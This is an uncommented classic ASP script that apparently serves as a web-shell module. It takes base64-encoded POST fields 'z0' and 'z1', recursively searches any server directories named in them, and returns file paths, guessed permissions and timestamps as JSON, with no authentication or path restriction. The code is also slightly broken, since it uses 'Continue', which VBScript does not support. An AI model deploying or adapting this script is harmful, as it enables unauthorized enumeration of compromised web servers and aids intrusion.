<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    GetCurrentCharset = charset
End Function

Function DecodeBase64(base64Str)
    If Trim(base64Str) = "" Then
        DecodeBase64 = ""
        Exit Function
    End If
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = base64Str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()
    DecodeBase64 = stream.ReadText
    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function fnPermission(item)
    Dim attr, p, isFolder
    attr = item.Attributes
    p = "Read"

    If (attr And 1) = 1 Then
        p = p & ""
    Else
        p = p & ",Write"
    End If

    isFolder = ((attr And 16) = 16)

    If Not isFolder Then
        Dim fName, ext
        fName = LCase(item.Name)
        If Right(fName, 4) = ".exe" Or Right(fName, 4) = ".bat" Or Right(fName, 4) = ".cmd" Then
            p = p & ",Execute"
        End If
    End If

    fnPermission = p
End Function

Function SearchFilesRecursive(folderObj, regEx, fso)
    Dim resultStr, isFirst, item, subFolder
    resultStr = ""
    isFirst = True

    On Error Resume Next

    For Each item In folderObj.Files
        If Err.Number <> 0 Then Err.Clear : Exit For
        If regEx.Test(item.Name) Then
            If Not isFirst Then resultStr = resultStr & ","
            resultStr = resultStr & BuildFileJson(item, "File")
            isFirst = False
        End If
    Next

    For Each subFolder In folderObj.SubFolders
        If Err.Number <> 0 Then Err.Clear : Continue
        If regEx.Test(subFolder.Name) Then
            If Not isFirst Then resultStr = resultStr & ","
            resultStr = resultStr & BuildFileJson(subFolder, "Directory")
            isFirst = False
        End If

        Dim deepResult
        deepResult = SearchFilesRecursive(subFolder, regEx, fso)
        If deepResult <> "" Then
            If Not isFirst Then resultStr = resultStr & ","
            resultStr = resultStr & deepResult
            isFirst = False
        End If
    Next

    SearchFilesRecursive = resultStr
End Function

Function BuildFileJson(itemObj, fileType)
    Dim json
    json = "{"
    json = json & """name"":""" & EscapeJson(itemObj.Name) & ""","
    json = json & """path"":""" & EscapeJson(itemObj.Path) & ""","
    json = json & """type"":""" & fileType & ""","
    
    json = json & """permission"":""" & fnPermission(itemObj) & """," 
    json = json & """created"":""" & FormatDateTime(itemObj.DateCreated, 2) & " " & FormatDateTime(itemObj.DateCreated, 3) & ""","
    json = json & """last_modified"":""" & FormatDateTime(itemObj.DateLastModified, 2) & " " & FormatDateTime(itemObj.DateLastModified, 3) & ""","
    json = json & """last_accessed"":""" & FormatDateTime(itemObj.DateLastAccessed, 2) & " " & FormatDateTime(itemObj.DateLastAccessed, 3) & """"
    json = json & "}"
    BuildFileJson = json
End Function

Function CreateVBScriptRegExp(rawPattern)
    Dim reg, p
    p = Trim(rawPattern)
    Set reg = New RegExp
    reg.IgnoreCase = True
    reg.Global = True
    If InStr(p, "*") > 0 Or InStr(p, "?") > 0 Then
        p = Replace(p, ".", "\.")
        p = Replace(p, "*", ".*")
        p = Replace(p, "?", ".")
        reg.Pattern = "^" & p & "$"
    Else
        Dim firstChar
        firstChar = Left(p, 1)
        If firstChar = "#" Or firstChar = "/" Then
            p = Mid(p, 2)
            If Right(p, 2) = "i" Or Right(p, 2) = "#" Then
                p = Left(p, Len(p) - 2)
            ElseIf Right(p, 1) = "#" Or Right(p, 1) = "/" Then
                p = Left(p, Len(p) - 1)
            End If
        End If
        reg.Pattern = p
    End If
    Set CreateVBScriptRegExp = reg
End Function

Function EscapeJson(str)
    If IsNull(str) Then
        EscapeJson = ""
        Exit Function
    End If
    Dim res
    res = Replace(str, "\", "\\")
    res = Replace(res, """", "\""")
    res = Replace(res, vbCrLf, "\n")
    res = Replace(res, vbCr, "\n")
    res = Replace(res, vbLf, "\n")
    EscapeJson = res
End Function

Function Main()
    On Error Resume Next
    Dim raw_regex, raw_dirs
    raw_regex = Request.Form("z0")
    raw_dirs = Request.Form("z1")

    If raw_dirs = "" Then
        Main = "{""status"":false,""msg"":""No parameters received""}"
        Exit Function
    End If

    Dim decoded_regex, decoded_dirs
    decoded_regex = DecodeBase64(raw_regex)
    decoded_dirs = DecodeBase64(raw_dirs)

    Dim regEx
    Set regEx = CreateVBScriptRegExp(decoded_regex)

    Dim dirsArray, target_dirs, dirItem, fso
    dirsArray = Split(decoded_dirs, ",")
    Set target_dirs = Server.CreateObject("Scripting.Dictionary")
    Set fso = Server.CreateObject("Scripting.FileSystemObject")

    For Each dirItem In dirsArray
        dirItem = Trim(dirItem)
        If fso.FolderExists(dirItem) Then
            If Not target_dirs.Exists(dirItem) Then
                target_dirs.Add dirItem, dirItem
            End If
        End If
    Next

    If target_dirs.Count = 0 Then
        Main = "{""status"":false,""msg"":""Cannot find any valid directory""}"
        Set fso = Nothing
        Exit Function
    End If

    Dim jsonResults, dirKey, isFirst
    jsonResults = ""
    isFirst = True

    For Each dirKey In target_dirs.Keys
        Dim currentFolder
        Set currentFolder = fso.GetFolder(dirKey)
        Dim subResult
        subResult = SearchFilesRecursive(currentFolder, regEx, fso)
        If subResult <> "" Then
            If Not isFirst Then jsonResults = jsonResults & ","
            jsonResults = jsonResults & subResult
            isFirst = False
        End If
    Next

    If Err.Number <> 0 Then
        Main = "{""status"":false,""msg"":""" & EscapeJson(Err.Description) & """}"
    Else
        Main = "{""status"":true,""results"":[" & jsonResults & "]}"
    End If

    Set fso = Nothing
    Set regEx = Nothing
    Set target_dirs = Nothing
End Function

Response.ContentType = "application/json"
Response.CharSet = "UTF-8"
Response.Write Main()

%>